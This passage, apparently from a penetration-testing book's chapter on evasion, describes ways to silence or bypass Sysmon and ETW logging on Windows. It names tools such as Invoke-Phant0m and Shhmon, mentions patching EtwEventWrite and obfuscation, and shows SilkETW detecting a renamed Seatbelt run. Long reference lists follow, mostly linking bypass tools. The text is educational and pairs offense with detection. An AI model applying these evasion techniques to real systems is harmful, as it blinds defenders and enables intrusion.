<p>We are close to concluding<a id="_idIndexMarker117"/> this section, so let’s briefly go through the possible ways to find and tamper with Sysmon. A great guide was created by <em class="italic">spotheplanet</em>[38]. An adversary can check process and service names, evaluate registry keys for Sysmon Windows Events, and search for Sysmon configs <span class="No-Break">and tools.</span></p>
<p>We have two main ways to bypass Sysmon – operate inside rules’ blind spots or disarm Sysmon. Rules bypass will be specific to the environment and may vary significantly. So, let’s have a look at what we can do to disarm Sysmon. <em class="italic">Olaf Hartong</em> has an excellent blog post describing possible venues for attackers[39]. Most of the techniques mentioned require highly privileged access on the box and can trigger an immediate critical security incident for the blue team, but they are still <span class="No-Break">worth mentioning:</span></p>
<ul>
<li><span class="No-Break">Configuration change</span></li>
<li>Sysmon <span class="No-Break">service stop</span></li>
<li><span class="No-Break">Suppress logging</span></li>
<li>Access/alter configuration <span class="No-Break">via registry</span></li>
<li>Process injection <span class="No-Break">in </span><span class="No-Break"><strong class="source-inline">Sysmon.exe</strong></span></li>
<li><span class="No-Break">Driver renaming</span></li>
</ul>
<p>The reliable way to silence Sysmon is by using the <strong class="bold">Invoke-Phant0m</strong> tool[40], which will keep the victim’s machine<a id="_idIndexMarker118"/> online but not logging anything, because it kills logging threads. There are also more advanced ways to put Sysmon in quiet mode, such as patching the <strong class="source-inline">EtwEventWrite</strong> API[41]. There is remarkable research done by <em class="italic">Code White</em><a id="_idIndexMarker119"/> that shows how Sysmon can be hooked and events can be manipulated[42]. Particularly, I would like to mention that this way of disarming Sysmon is probably the most silent publicly available way, as stated that by the researchers[42]: “<em class="italic">no suspicious ProcessAccess events on Sysmon are observable via Sysmon or the Event Log making the detection (</em><span class="No-Break"><em class="italic">supposedly) nontrivial.</em></span><span class="No-Break">”</span></p>
<p>Another way is to unload the Sysmon<a id="_idIndexMarker120"/> driver completely using a tool called <strong class="bold">Shhmon</strong>[43]. It allows the attacker to find even renamed Sysmon drivers and unload them. We can also use a built-in utility called <strong class="source-inline">fltMC.exe</strong> or the <strong class="source-inline">misc::mflt</strong> Mimikatz module for the same purpose. Anyway, there are notable events left in logs that can be used to hunt for <span class="No-Break">this technique.</span></p>
<h1 id="_idParaDest-36"><a id="_idTextAnchor035"/>Event Tracing for Windows (ETW)</h1>
<p><strong class="bold">Event Tracing for Windows</strong> (<strong class="bold">ETW</strong>) is a kernel-level tracing facility for logging events and is intended<a id="_idIndexMarker121"/> to be used for application debugging and can be enabled/disabled without restarting the application/system. In short, the system consists of three components – controllers, providers, and consumers. Controllers are used to start/stop the Event Tracing session, which is used to receive events from providers and deliver them to consumers. To start using ETW, I can recommend the most detailed beginners guide[44]. <em class="italic">Bmcder</em> shows how to use the <strong class="source-inline">logman</strong> and <strong class="source-inline">wevtutil.exe</strong> tools, event manifests, and APIs to access ETW. At the end, there is a list of useful providers for the blue team. Also, it’s important to note that ETW is useful for collecting ongoing events rather than historical ones. However, the number of events is huge and will require post-processing using SIEM <span class="No-Break">and/or Yara.</span></p>
<p>Let’s investigate how to use ETW for .NET tooling usage visibility. There are two excellent blog posts by <em class="italic">F-Secure</em> on how to detect malicious use of .NET. Part 1[45] is dedicated to the process of loading .NET assemblies and how to gain visibility of them. Part 2[46] goes into the details of JIT and Interop tracing, showing how malicious examples of Meterpreter and SafetyKatz can be detected. Method names, assemblies, and common malware API calls will be a security concern for an insightful defender. For both offensive and defensive tests, we can use a great tool created by <em class="italic">FuzzySec</em> called <strong class="bold">SilkETW</strong>[47]. Essentially, it is a set of wrappers<a id="_idIndexMarker122"/> for ETW that we can use in real time for collecting and filtering .NET events from <strong class="source-inline">Microsoft-Windows-DotNETRuntime</strong> and other providers. We can further enhance our analysis by applying known indicators of compromise from Yara. Following is a simple example<a id="_idIndexMarker123"/> of running <span class="No-Break">renamed Seatbelt[48]:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer044">
<img alt="Figure 2.16 – Process Hacker shows loaded .NET assemblies" height="322" src="image/B18964_02_16.jpg" width="520"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.16 – Process Hacker shows loaded .NET assemblies</p>
<p>We will start SilkETW by using the <span class="No-Break">following command:</span></p>
<pre class="console">
 .\SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -l verbose -ot eventlog</pre> <p>After the launch of the SilkETW process, 820 events have been collected already. We execute Seatbelt to get system information by running the <span class="No-Break">following command:</span></p>
<pre class="console">
.\legit_binary.exe OSInfo</pre> <p>The number of events goes up to 1,763, and some of them include indicators of compromise. Going through these events allows security products such as Yara or modern AV/EDR solutions to detect <span class="No-Break">our activity:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer045">
<img alt="Figure 2.17 – SilkETW in action" height="849" src="image/B18964_02_17.jpg" width="859"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.17 – SilkETW in action</p>
<p>One of the<a id="_idIndexMarker124"/> corresponding <a id="_idIndexMarker125"/>log entries is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer046">
<img alt="Figure 2.18 – Multiple Seatbelt entries inside the log" height="444" src="image/B18964_02_18.jpg" width="1273"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 2.18 – Multiple Seatbelt entries inside the log</p>
<p>We have two main strategies to avoid detection – tamper with ETW or use some kind of obfuscation. One example of an open source protector is <strong class="source-inline">ConfuserEx</strong>[49]. It still leaves some IOCs, but it can be a good starting point, as was demonstrated in the blog post by <em class="italic">White </em><span class="No-Break"><em class="italic">Knight Labs</em></span><span class="No-Break">[50].</span></p>
<p>A more promising way to bypass ETW is to hide tradecraft from it. <em class="italic">XPN</em> published great research on how to do it in his blog[51]. The idea has much in common with AMSI bypass – patch the call to <strong class="source-inline">ntdll!EtwEventWrite</strong> in a way that will not log anything. Another way to achieve the same result was demonstrated by <em class="italic">Cneelis</em> in his <span class="No-Break">TamperETW[52] example.</span></p>
<p>To observe ETW<a id="_idIndexMarker126"/> in action, I encourage you to read an excellent blog post by <em class="italic">mez0</em>[53]. The author demonstrates .NET provider creation, simple .NET loader detection, and ETW neutralization. Repairing the ETW provider after execution is demonstrated as well. Links to relevant research and an overview of other security ETW providers are included as well, making this research unique <span class="No-Break">and distinguishable.</span></p>
<p>A list of other ETW tampering techniques was published by <em class="italic">Palantir</em> in their blog[54]. Two of these techniques (Autologger provider removal and provider <strong class="source-inline">Enable</strong> property modification) will require reboot, and all of them require at least <span class="No-Break">administrator privileges.</span></p>
<h1 id="_idParaDest-37"><a id="_idTextAnchor036"/>Summary</h1>
<p>In this chapter, we demonstrated the basic concepts of evasion for common security controls. This is just the tip of the iceberg, as we did not cover AV/EDR bypass, tool customization, shellcode loaders, and much more. We covered built-in controls (AMSI) as well as enhanced security components that can be deployed by Group Policies in the domain (AppLocker and Enhanced PowerShell Security). Then, we had a look at possible detection mechanisms that can be enforced in Windows with the help of Sysmon <span class="No-Break">and ETW.</span></p>
<p>In the upcoming chapters, we are going to use different tools and focus on concepts. We will run tools on machines with Microsoft Defender disabled. It is important to show that evasion is a vital part of the process and always comes first. The key to success is to know what our tools are doing under the hood, and what IOCs we leave on <span class="No-Break">compromised machines.</span></p>
<p>The next chapter will be devoted to domain enumeration. We will see how it can be done with different tools, what the well-known patterns are for such activities, and how not to miss <span class="No-Break">important bits.</span></p>
<h1 id="_idParaDest-38"><a id="_idTextAnchor037"/>References</h1>
<ol>
<li>Process <span class="No-Break">Hacker: </span><a href="https://processhacker.sourceforge.io/"><span class="No-Break">https://processhacker.sourceforge.io/</span></a></li>
<li>API <span class="No-Break">monitor: </span><a href="http://www.rohitab.com/apimonitor"><span class="No-Break">http://www.rohitab.com/apimonitor</span></a></li>
<li>AMSI bypass list by <span class="No-Break"><em class="italic">S3cu<a id="_idTextAnchor038"/>r3Th1sSh1t:</em></span><span class="No-Break"> </span><a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell"><span class="No-Break">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</span></a></li>
<li>AMSI bypass list by <span class="No-Break"><em class="italic">Pentestlaboratories:</em></span><span class="No-Break"> </span><a href="https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/"><span class="No-Break">https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/</span></a></li>
<li>Invoke-Obfuscation <span class="No-Break">script: </span><a href="https://github.com/danielbohannon/Invoke-Obfuscation"><span class="No-Break">https://github.com/danielbohannon/Invoke-Obfuscation</span></a></li>
<li>Nishang <span class="No-Break">project: </span><a href="https://github.com/samratashok/nishang"><span class="No-Break">https://github.com/samratashok/nishang</span></a></li>
<li><span class="No-Break">Powercat: </span><a href="https://github.com/besimorhino/powercat"><span class="No-Break">https://github.com/besimorhino/powercat</span></a></li>
<li>Persistence via <span class="No-Break">AMSI: </span><a href="https://pentestlab.blog/2021/05/17/persistence-amsi/"><span class="No-Break">https://pentestlab.blog/2021/05/17/persistence-amsi/</span></a></li>
<li>Threat Hunting AMSI bypasses by Pentest <span class="No-Break">Laboratories: </span><a href="https://pentestlaboratories.com/2021/06/01/threat-hunting-amsi-bypasses/"><span class="No-Break">https://pentestlaboratories.com/2021/06/01/threat-hunting-amsi-bypasses/</span></a></li>
<li>Hunt for AMSI bypasses by <span class="No-Break"><em class="italic">F-Secure</em></span><span class="No-Break">: </span><a href="https://blog.f-secure.com/hunting-for-amsi-bypasses/"><span class="No-Break">https://blog.f-secure.com/hunting-for-amsi-bypasses/</span></a></li>
<li>Tiraniddo’s research about Applocker <span class="No-Break">internals: </span><a href="https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.xhtml"><span class="No-Break">https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.xhtml</span></a></li>
<li>Sensitive PowerShell capabilities constrained by <span class="No-Break">CLM: </span><a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/#what-does-constrained-language-constrain"><span class="No-Break">https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/#what-does-constrained-language-constrain</span></a></li>
<li>AppLocker beginners <span class="No-Break">guide: </span><a href="https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/"><span class="No-Break">https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/</span></a></li>
<li>AppLocker bypass using <span class="No-Break">InstallUtil: </span><a href="https://www.ired.team/offensive-security/code-execution/t1118-installutil"><span class="No-Break">https://www.ired.team/offensive-security/code-execution/t1118-installutil</span></a></li>
<li>AppLocker bypass using <span class="No-Break">MSBuild: </span><a href="https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c"><span class="No-Break">https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c</span></a></li>
<li>AppLocker bypass list <span class="No-Break">project: </span><a href="https://github.com/api0cradle/UltimateAppLockerByPassList"><span class="No-Break">https://github.com/api0cradle/UltimateAppLockerByPassList</span></a></li>
<li>PowerShdll project uses PowerShell automation <span class="No-Break">DLLs: </span><a href="https://github.com/p3nt4/PowerShdll"><span class="No-Break">https://github.com/p3nt4/PowerShdll</span></a></li>
<li>PSBypassCLM project to create a wrapper over <span class="No-Break">InstalUtil: </span><a href="https://github.com/padovah4ck/PSByPassCLM"><span class="No-Break">https://github.com/padovah4ck/PSByPassCLM</span></a></li>
<li>Bypass-CLM project to patch the return <span class="No-Break">value: </span><a href="https://github.com/calebstewart/bypass-clm"><span class="No-Break">https://github.com/calebstewart/bypass-clm</span></a></li>
<li>Bypass CLM with the help of <span class="No-Break">COM: </span><a href="https://blog.xpnsec.com/constrained-language-mode-bypass/"><span class="No-Break">https://blog.xpnsec.com/constrained-language-mode-bypass/</span></a></li>
<li>Bypass CLM by setting the HKCU environment <span class="No-Break">value: </span><a href="https://sp00ks-git.github.io/posts/CLM-Bypass/"><span class="No-Break">https://sp00ks-git.github.io/posts/CLM-Bypass/</span></a></li>
<li>AaronLocker <span class="No-Break">project: </span><a href="https://github.com/microsoft/AaronLocker"><span class="No-Break">https://github.com/microsoft/AaronLocker</span></a></li>
<li>Deploy WDAC and <span class="No-Break">AppLocker: </span><a href="https://improsec.com/tech-blog/one-thousand-and-one-application-blocks"><span class="No-Break">https://improsec.com/tech-blog/one-thousand-and-one-application-blocks</span></a></li>
<li><span class="No-Break">Sysmon: </span><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon"><span class="No-Break">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</span></a></li>
<li>Sysmon Community <span class="No-Break">Guide: </span><a href="https://github.com/trustedsec/SysmonCommunityGuide"><span class="No-Break">https://github.com/trustedsec/SysmonCommunityGuide</span></a></li>
<li>Sysmon config version by <span class="No-Break"><em class="italic">SwiftOnSecurity</em></span><span class="No-Break">: </span><a href="https://github.com/SwiftOnSecurity/sysmon-config"><span class="No-Break">https://github.com/SwiftOnSecurity/sysmon-config</span></a></li>
<li>Sysmon config version by <em class="italic">Florian </em><span class="No-Break"><em class="italic">Roth</em></span><span class="No-Break">: </span><a href="https://github.com/Neo23x0/sysmon-config"><span class="No-Break">https://github.com/Neo23x0/sysmon-config</span></a></li>
<li>Sysmon config version by <em class="italic">Olaf </em><span class="No-Break"><em class="italic">Hartong</em></span><span class="No-Break">: </span><a href="https://github.com/olafhartong/sysmon-modular"><span class="No-Break">https://github.com/olafhartong/sysmon-modular</span></a></li>
<li>ScriptBlock Logging bypass by <span class="No-Break"><em class="italic">cobbr.io</em></span><span class="No-Break">: </span><a href="https://cobbr.io/ScriptBlock-Logging-Bypass.xhtml"><span class="No-Break">https://cobbr.io/ScriptBlock-Logging-Bypass.xhtml</span></a></li>
<li>ScriptBlock Warning Event Logging by <span class="No-Break">cobbr.io: </span><a href="https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.xhtml"><span class="No-Break">https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.xhtml</span></a></li>
<li><span class="No-Break">DeepBlue: </span><a href="https://github.com/sans-blue-team/DeepBlueCLI"><span class="No-Break">https://github.com/sans-blue-team/DeepBlueCLI</span></a></li>
<li>Newish bypasses Part <span class="No-Break">1: </span><a href="https://www.bc-security.org/post/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/"><span class="No-Break">https://www.bc-security.org/post/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/</span></a></li>
<li>Newish bypasses Part <span class="No-Break">2: </span><a href="https://www.bc-security.org/post/powershell-logging-obfuscation-and-some-newish-bypasses-part-2/"><span class="No-Break">https://www.bc-security.org/post/powershell-logging-obfuscation-and-some-newish-bypasses-part-2/</span></a></li>
<li>PowerShell Protect <span class="No-Break">Module: </span><a href="https://blog.ironmansoftware.com/protect-logging-bypass/"><span class="No-Break">https://blog.ironmansoftware.com/protect-logging-bypass/</span></a></li>
<li>Bypass of <span class="No-Break">EnableTranscripting: </span><a href="https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass"><span class="No-Break">https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass</span></a></li>
<li>Invisi-Shell tool: <a href="https://github.com/OmerYa/Invisi-Shell">https://github.com/OmerYa/Invisi-Shell</a> <span class="No-Break">and </span><a href="https://www.youtube.com/watch?v=Y3oMEiySxcc"><span class="No-Break">https://www.youtube.com/watch?v=Y3oMEiySxcc</span></a></li>
<li>Stracciatella <span class="No-Break">tool: </span><a href="https://github.com/mgeeky/Stracciatella"><span class="No-Break">https://github.com/mgeeky/Stracciatella</span></a></li>
<li>Detect <span class="No-Break">Sysmon: </span><a href="https://www.ired.team/offensive-security/enumeration-and-discovery/detecting-sysmon-on-the-victim-host"><span class="No-Break">https://www.ired.team/offensive-security/enumeration-and-discovery/detecting-sysmon-on-the-victim-host</span></a></li>
<li>Sysmon <span class="No-Break">tampering: </span><a href="mailto:https://medium.com/@olafhartong/endpoint-detection-superpowers-on-the-cheap-part-3-sysmon-tampering-49c2dc9bf6d9"><span class="No-Break">https://medium.com/@olafhartong/endpoint-detection-superpowers-on-the-cheap-part-3-sysmon-tampering-49c2dc9bf6d9</span></a></li>
<li>Phant0m <span class="No-Break">tool: </span><a href="https://github.com/hlldz/Phant0m"><span class="No-Break">https://github.com/hlldz/Phant0m</span></a></li>
<li><span class="No-Break">SysmonQuiet: </span><a href="https://github.com/ScriptIdiot/SysmonQuiet"><span class="No-Break">https://github.com/ScriptIdiot/SysmonQuiet</span></a></li>
<li><span class="No-Break">SysmonEnte: </span><a href="https://codewhitesec.blogspot.com/2022/09/attacks-on-sysmon-revisited-sysmonente.xhtml"><span class="No-Break">https://codewhitesec.blogspot.com/2022/09/attacks-on-sysmon-revisited-sysmonente.xhtml</span></a></li>
<li><span class="No-Break">Shhmon: </span><a href="https://github.com/matterpreter/Shhmon"><span class="No-Break">https://github.com/matterpreter/Shhmon</span></a></li>
<li>ETW beginner’s <span class="No-Break">guide: </span><a href="https://bmcder.com/blog/a-begginers-all-inclusive-guide-to-etw"><span class="No-Break">https://bmcder.com/blog/a-begginers-all-inclusive-guide-to-etw</span></a></li>
<li>Detect malicious usage of .NET part <span class="No-Break">1: </span><a href="https://blog.f-secure.com/detecting-malicious-use-of-net-part-1/"><span class="No-Break">https://blog.f-secure.com/detecting-malicious-use-of-net-part-1/</span></a></li>
<li>Detect malicious usage of .NET part <span class="No-Break">2: </span><a href="https://blog.f-secure.com/detecting-malicious-use-of-net-part-2/"><span class="No-Break">https://blog.f-secure.com/detecting-malicious-use-of-net-part-2/</span></a></li>
<li><span class="No-Break">SilkETW: </span><a href="https://github.com/mandiant/SilkETW"><span class="No-Break">https://github.com/mandiant/SilkETW</span></a></li>
<li><span class="No-Break">Seatbelt: </span><a href="https://github.com/GhostPack/Seatbelt"><span class="No-Break">https://github.com/GhostPack/Seatbelt</span></a></li>
<li><span class="No-Break">ConfuserEx: </span><a href="https://github.com/mkaring/ConfuserEx"><span class="No-Break">https://github.com/mkaring/ConfuserEx</span></a></li>
<li>Bypass ETW by neutering the EtwEventWrite <span class="No-Break">API: </span><a href="https://whiteknightlabs.com/2021/12/11/bypassing-etw-for-fun-and-profit/"><span class="No-Break">https://whiteknightlabs.com/2021/12/11/bypassing-etw-for-fun-and-profit/</span></a></li>
<li>Patch EtwEventWrite <span class="No-Break">API: </span><a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/"><span class="No-Break">https://blog.xpnsec.com/hiding-your-dotnet-etw/</span></a></li>
<li><span class="No-Break">TamperETW: </span><a href="https://github.com/outflanknl/TamperETW"><span class="No-Break">https://github.com/outflanknl/TamperETW</span></a></li>
<li>Evade ETW and <span class="No-Break">AMSI: </span><a href="https://pre.empt.blog/2023/maelstrom-6-working-with-amsi-and-etw-for-red-and-blue"><span class="No-Break">https://pre.empt.blog/2023/maelstrom-6-working-with-amsi-and-etw-for-red-and-blue</span></a></li>
<li>Tampering with <span class="No-Break">ETW: </span><a href="https://blog.palantir.com/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63"><span class="No-Break">https://blog.palantir.com/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63</span></a></li>
</ol>
<h1 id="_idParaDest-39"><a id="_idTextAnchor039"/>Further reading</h1>
<p>These aids for further study will let you dive deeper into the attacks covered in <span class="No-Break">the chapter:</span></p>
<ul>
<li>Great blog post with ready-to-use code for <span class="No-Break">AmsiScanBufferBypass: </span><a href="https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/"><span class="No-Break">https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/</span></a><span class="No-Break">.</span></li>
<li>Excellent blog post about PowerShell CLM and examples of rule <span class="No-Break">evaluation: </span><a href="https://p0w3rsh3ll.wordpress.com/2019/03/07/applocker-and-powershell-how-do-they-tightly-work-together/"><span class="No-Break">https://p0w3rsh3ll.wordpress.com/2019/03/07/applocker-and-powershell-how-do-they-tightly-work-together/</span></a></li>
<li>There is an excellent post that combines the MSBuild and InstallUtils AppLocker bypass <span class="No-Break">methods: </span><a href="https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/"><span class="No-Break">https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/</span></a></li>
</ul>
</div>
</div></body></html>